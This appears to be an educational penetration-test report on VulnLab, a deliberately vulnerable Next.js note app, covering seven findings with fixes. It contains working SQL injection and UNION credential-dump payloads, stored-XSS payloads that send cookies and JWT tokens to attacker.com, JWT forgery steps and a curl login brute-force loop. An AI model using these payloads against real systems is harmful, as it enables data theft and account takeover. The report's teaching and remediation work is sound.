# Security Assessment Report

**Target Application:** VulnLab — Note Sharing Web Application  
**Assessment Type:** Black-box + Source Code Review  
**Tester:** Phuriphatthanachai Rattanatham (Phuriphat)  
**Date:** 2 June 2026  
**Classification:** Educational / Portfolio  

---

## Executive Summary

A security assessment was conducted against VulnLab, an intentionally vulnerable note-sharing web application built on Next.js and MySQL. The assessment identified **7 confirmed vulnerabilities** across 4 OWASP Top 10 categories, including 2 High severity, 4 Medium severity, and 1 Low severity findings.

The most critical issues are an unauthenticated SQL Injection on the search endpoint — which allows full database read access — and a pervasive Insecure Direct Object Reference (IDOR) vulnerability across both the notes and user profile APIs.

| Severity | Count |
|----------|-------|
| 🔴 High | 2 |
| 🟠 Medium | 4 |
| 🟡 Low | 1 |
| **Total** | **7** |

---

## Scope

| Item | Detail |
|------|--------|
| Application | VulnLab Note Sharing App |
| Frontend | `http://localhost:3000` (Next.js 15) |
| Backend | Next.js API Routes |
| Database | MySQL via Prisma ORM |
| Auth Mechanism | JWT stored in localStorage |
| Test Accounts | `testuser1`, `test3`, `test4` |
| In Scope | All API endpoints, frontend rendering, authentication flow |
| Out of Scope | Infrastructure, third-party dependencies |

---

## Methodology

Testing followed a manual black-box approach supplemented by source code review, covering:

1. **Reconnaissance** — mapping endpoints via browser DevTools and source inspection
2. **Authentication Testing** — JWT analysis, session handling
3. **Authorization Testing** — IDOR via URL/parameter manipulation
4. **Injection Testing** — SQL injection via search input
5. **Client-side Testing** — XSS via note content field
6. **Source Code Review** — confirming root causes in API route handlers

Tools used: Chrome DevTools, Thunder Client (VS Code), manual browser testing, URL manipulation.

---

## Findings

### VULN-01 — SQL Injection

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 High |
| **OWASP** | A03:2021 — Injection |
| **Endpoint** | `GET /api/search?q=` |
| **Impact** | Full database read — notes + user credentials |

**Description**

The search endpoint passes user input directly into a raw SQL query via Prisma's `$queryRawUnsafe()` with no sanitization. An attacker can manipulate the query to bypass filters and dump the entire database.

**Steps to Reproduce**

1. Navigate to `/search`
2. Enter payload: `' OR 1=1 #`
3. All notes from all users are returned — including private notes
4. Enter Union-based payload to extract user table:

```
' OR (1=0) UNION SELECT id,username,password,email,createdAt,createdAt,id FROM User --
```

5. Response includes hashed passwords and emails of all registered users

**Evidence**

- Payload `' OR 1=1 #` returns all 9 notes including private notes across all users
- Union probe returns User table rows mapped into the notes response shape
- Frontend displays "SQL Injection Detected" banner confirming the injection path

**Root Cause**

```javascript
// app/api/search/route.js
const results = await prisma.$queryRawUnsafe(
  `SELECT * FROM Note WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`
)
```

**Remediation**

Replace `$queryRawUnsafe` with parameterized queries:

```javascript
const results = await prisma.$queryRaw`
  SELECT * FROM Note
  WHERE title LIKE ${'%' + q + '%'}
  OR content LIKE ${'%' + q + '%'}
`
```

Or use the Prisma ORM query builder to avoid raw SQL entirely.

---

### VULN-02 — Insecure Direct Object Reference (IDOR) on Notes

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 High |
| **OWASP** | A01:2021 — Broken Access Control |
| **Endpoint** | `GET/PUT/DELETE /api/notes/:id` |
| **Impact** | Read, modify, or delete any user's notes — including private |

**Description**

The notes API exposes internal object IDs in the URL and performs no ownership check. Any authenticated user can read, edit, or delete notes belonging to other users by manipulating the `id` parameter.

**Steps to Reproduce**

1. Log in as `test3` — note the ID badge on a note card (e.g. `id:19`)
2. In a separate session, log in as `test4` — create a note (e.g. `id:27`)
3. As `test3`, send: `GET /api/notes/27` with `test3`'s token
4. API returns `test4`'s note — including private notes

```http
GET /api/notes/27
Authorization: Bearer <test3_token>

HTTP/1.1 200 OK
{ "id": 27, "title": "note user4", "authorId": 20, "isPublic": false, ... }
```

**Evidence**

- Note IDs visibly exposed on every NoteCard via `id:XX` badge
- `GET /api/notes/:id` returns notes regardless of token ownership
- `PUT /api/notes/:id` and `DELETE /api/notes/:id` succeed on other users' notes via Thunder Client

**Root Cause**

```javascript
// app/api/notes/[id]/route.js — no ownership check
const note = await prisma.note.findUnique({ where: { id } })
return NextResponse.json(note)
```

**Remediation**

```javascript
const session = await getServerSession()
if (note.authorId !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

### VULN-03 — Cross-Site Scripting (XSS)

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 Medium |
| **OWASP** | A03:2021 — Injection |
| **Component** | `NoteCard`, `ResultCard` — note content display |
| **Impact** | Stored XSS affecting all users who view a public note |

**Description**

Note content is rendered via React's `dangerouslySetInnerHTML` without sanitization. Any HTML or JavaScript injected into the content field executes in the browser of any user who views the note. Because notes can be public, this is a **stored XSS** with wide blast radius.

**Steps to Reproduce**

1. Log in and create a note
2. In the Content field, enter:

```html
<img src=x onerror="alert('XSS: ' + document.cookie)">
```

3. Save the note — alert fires immediately
4. Any other user viewing the public note also triggers the alert

**Potential cookie theft payload:**

```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
```

**Evidence**

- Alert box fires on note render with injected payload
- `dangerouslySetInnerHTML={{ __html: note.content }}` confirmed in source
- Content placeholder reads: `Write anything... or inject <script>alert(1)</script>`

**Root Cause**

```jsx
// components used in notes/page.js and search/page.js
<div
  className="..."
  dangerouslySetInnerHTML={{ __html: note.content }}
/>
```

**Remediation**

Sanitize with DOMPurify before rendering:

```javascript
import DOMPurify from 'dompurify'

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(note.content) }} />
```

Or render as plain text using `<p>{note.content}</p>` if HTML formatting is not required.

---

### VULN-04 — Broken Access Control on User Profiles

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 Medium |
| **OWASP** | A01:2021 — Broken Access Control |
| **Endpoint** | `GET/PUT /api/users/:id` |
| **Impact** | View and modify any user's profile data |

**Description**

The profile endpoint accepts a user `id` from the URL and returns the corresponding profile without verifying it matches the authenticated user. Any authenticated user can view — and edit — another user's account by changing the `id` in the URL.

**Steps to Reproduce**

1. Log in as `test3` — URL becomes `/profile?id=19`
2. Change URL to `/profile?id=20`
3. Page loads `test4`'s profile: username, email, user ID, join date
4. Click Edit → Save — API updates `test4`'s account without error

```http
GET /api/users/20
Authorization: Bearer <test3_token>

HTTP/1.1 200 OK
{ "id": 20, "username": "test4", "email": "test4@test.com", ... }
```

**Evidence**

- URL change to `?id=20` while logged in as `test3` loads `test4`'s profile
- Warning banner `⚠ Viewing profile of @test4 — not your account` confirms the exploit
- Edit + Save successfully modifies `test4`'s username and email

**Root Cause**

```javascript
// app/api/users/[id]/route.js — id from URL, no auth check
const { id } = params
const user = await prisma.user.findUnique({ where: { id: parseInt(id) } })
return NextResponse.json(user)
```

**Remediation**

```javascript
const session = await getServerSession()
if (parseInt(id) !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

---

### VULN-05 — Cryptographic Failures (Weak JWT Secret)

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 Medium |
| **OWASP** | A02:2021 — Cryptographic Failures |
| **Component** | `lib/auth.js`, token storage in `localStorage` |
| **Impact** | JWT forgery — authenticate as any user without credentials |

**Description**

The JWT secret is hardcoded as `"supersecretkey123"` in `.env`. This short, predictable string can be brute-forced offline. Any attacker who obtains it can forge arbitrary JWT tokens and authenticate as any user. Additionally, tokens are stored in `localStorage` instead of an `httpOnly` cookie, making them accessible to JavaScript — so any XSS payload (VULN-03) can silently steal the token.

**Steps to Reproduce**

1. Open DevTools → Application → localStorage — copy the `token` value
2. Decode at [jwt.io](https://jwt.io) — payload reveals `id` and `username` in plain text
3. Modify `id` to another user's ID, re-sign with secret `"supersecretkey123"`
4. Replace token in localStorage — refresh page
5. All protected API endpoints accept the forged token

**Token theft via XSS:**
```html
<script>
  fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))
</script>
```

**Evidence**

- JWT secret confirmed as `"supersecretkey123"` hardcoded in `.env`
- Token decoded at jwt.io exposes user `id` and `username`
- Forged token accepted by all protected endpoints

**Root Cause**

```javascript
// lib/auth.js
const generateToken = (payload) => {
  return jwt.sign(payload, process.env.JWT_SECRET || 'secret', { expiresIn: '7d' })
}
// .env
// JWT_SECRET="supersecretkey123"  ← weak, hardcoded, predictable
```

**Remediation**

```javascript
// Use strong secret from environment variable
const JWT_SECRET = process.env.JWT_SECRET // 256-bit random hex

// Store token in httpOnly cookie instead of localStorage
res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' })
```

---

### VULN-06 — Security Misconfiguration (Stack Trace Exposure)

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Low |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **Endpoint** | All API routes — any unhandled exception |
| **Impact** | Internal path disclosure, application structure exposure |

**Description**

All API error handlers return the full JavaScript error message and stack trace in the response body. This exposes internal file paths, application structure, and dependency information to any attacker who can trigger an error.

**Steps to Reproduce**

1. Send a malformed request to any API endpoint (e.g. missing required fields)
2. Response body contains `message` and `stack`:

```http
POST /api/auth/register
{ "email": "test" }

HTTP/1.1 500 Internal Server Error
{
  "message": "...",
  "stack": "Error: ...\n    at /home/runner/work/vulnlab/app/backend/src/controllers/auth.controller.js:12:..."
}
```

**Evidence**

- `stack` field visible in all 500 responses via DevTools Network tab
- File paths reveal project structure: `/app/backend/src/controllers/`
- Node.js version and dependency info inferred from stack frames

**Root Cause**

```javascript
// All controllers — intentional exposure
} catch (error) {
  res.status(500).json({ message: error.message, stack: error.stack })
}
```

**Remediation**

```javascript
} catch (error) {
  console.error(error) // log internally only
  const isDev = process.env.NODE_ENV === 'development'
  res.status(500).json({
    message: isDev ? error.message : 'Internal server error',
    stack: isDev ? error.stack : undefined
  })
}
```

---

### VULN-07 — Identification and Authentication Failures (No Rate Limiting)

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 Medium |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Endpoint** | `POST /api/auth/login` |
| **Impact** | Unlimited brute-force attempts, no detection capability |

**Description**

The login endpoint has no rate limiting, account lockout, or brute-force protection. An attacker can make unlimited login attempts against any account. Failed login attempts are not logged, making it impossible to detect or alert on such activity.

**Steps to Reproduce**

```bash
# 1000 login attempts — no throttling, no lockout, no 429
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test3@test.com","password":"attempt'$i'"}'
done
```

All 1000 requests return `401 Invalid credentials` — none blocked or delayed. No `X-RateLimit-*` or `Retry-After` headers present. Server logs show no record of failed attempts.

**Root Cause**

```javascript
// auth.controller.js
const login = async (req, res) => {
  // VULNERABILITY: ไม่มี rate limiting, ไม่มี logging
  const user = await prisma.user.findUnique({ where: { email } })
  ...
}
```

**Remediation**

```javascript
const rateLimit = require('express-rate-limit')

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // max 10 attempts per window
  message: { message: 'Too many login attempts. Try again later.' }
})

router.post('/login', loginLimiter, loginController)

// Log failed attempts
if (!isValid) {
  console.warn(`[AUTH] Failed login for ${email} from ${req.ip}`)
  return res.status(401).json({ message: 'Invalid credentials' })
}
```


## Risk Summary

| ID | Vulnerability | Severity | OWASP | Status |
|----|--------------|----------|-------|--------|
| VULN-01 | SQL Injection — Search Endpoint | 🔴 High | A03 | Intentional |
| VULN-02 | IDOR — Notes API | 🔴 High | A01 | Intentional |
| VULN-03 | Stored XSS — Note Content | 🟠 Medium | A03 | Intentional |
| VULN-04 | Broken Access Control — User Profile | 🟠 Medium | A01 | Intentional |
| VULN-05 | Cryptographic Failures — Weak JWT Secret | 🟠 Medium | A02 | Intentional |
| VULN-06 | Security Misconfiguration — Stack Trace Exposure | 🟡 Low | A05 | Intentional |
| VULN-07 | Auth Failures — No Rate Limit on Login | 🟠 Medium | A07 | Intentional |

---

## Automated Test Coverage

All vulnerabilities above are covered by automated E2E tests in the Playwright test suite:

| Test | Vulnerability Verified |
|------|------------------------|
| `search.spec.js` — SQLi payload returns all notes | VULN-01 |
| `notes.spec.js` — IDOR badge on other users' notes | VULN-02 |
| `notes.spec.js` — edit note of another user (IDOR exploit) | VULN-02 |
| `profile.spec.js` — IDOR warning when editing another profile | VULN-04 |

CI pipeline runs the full suite on every push via GitHub Actions.

---

---

## OWASP ZAP Automated Scan Results

**Scan Date:** 2 June 2026  
**Tool:** OWASP ZAP (zaproxy/zap-stable via Docker)  
**Target:** `http://localhost:3000` (Frontend — unauthenticated)  
**Scan Type:** Baseline Passive Scan  
**URLs Scanned:** 28  

> **Note:** ZAP scanned the unauthenticated surface only. Core vulnerabilities (SQLi, IDOR, XSS, BAC) require authentication and are covered by integration and E2E tests. ZAP findings below are additional misconfiguration issues detected automatically.

### ZAP Summary

| Result | Count |
|--------|-------|
| PASS | 56 |
| WARN | 11 |
| FAIL | 0 |

### ZAP Warnings (WARN-NEW)

| # | Rule | ID | Severity | URLs Affected |
|---|------|----|----------|---------------|
| 1 | Missing Anti-clickjacking Header | 10020 | 🟡 Low | 2 |
| 2 | X-Content-Type-Options Header Missing | 10021 | 🟡 Low | 5 |
| 3 | Information Disclosure - Suspicious Comments | 10027 | 🟡 Low | 32 |
| 4 | Server Leaks Info via X-Powered-By Header | 10037 | 🟡 Low | 4 |
| 5 | Content Security Policy (CSP) Header Not Set | 10038 | 🟡 Low | 4 |
| 6 | Storable and Cacheable Content | 10049 | 🟡 Low | 7 |
| 7 | Permissions Policy Header Not Set | 10063 | 🟡 Low | 5 |
| 8 | Timestamp Disclosure - Unix | 10096 | 🟡 Low | 1 |
| 9 | Modern Web Application | 10109 | ℹ️ Info | 2 |
| 10 | Dangerous JS Functions | 10110 | 🟡 Low | 2 |
| 11 | Cross-Origin-Embedder-Policy Header Missing | 90004 | 🟡 Low | 7 |

### Notable ZAP Finding — Dangerous JS Functions (10110)

ZAP flagged `dangerouslySetInnerHTML` usage in the compiled JavaScript bundles — this directly corresponds to **VULN-03 (XSS)** documented above. ZAP detected the dangerous function pattern at:

- `react-server-dom-turbopack` bundle
- `turbopack-app_frontend` bundle

This confirms the XSS vulnerability is present in the deployed frontend code.

### Recommended Security Headers (Remediation for ZAP Warnings)

Add the following to `next.config.js`:

```javascript
const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Powered-By', value: '' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  },
  { key: 'Cross-Origin-Embedder-Policy', value: 'require-corp' },
]

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }]
  }
}
```

Full ZAP HTML report available at: `tests/security/reports/zap-report.html`


## Disclaimer

VulnLab is an **intentionally vulnerable** application built for educational and portfolio purposes. All vulnerabilities documented in this report exist by design and are confined to a local development environment. This application must never be deployed to a public server.

---

*Report by [Phuriphatthanachai Rattanatham](https://ctrlfaith-portfolio.vercel.app) — [GitHub](https://github.com/ctrlfaith)*  
*VulnLab — Vulnerable Web App + Full QA & Security Test Suite*
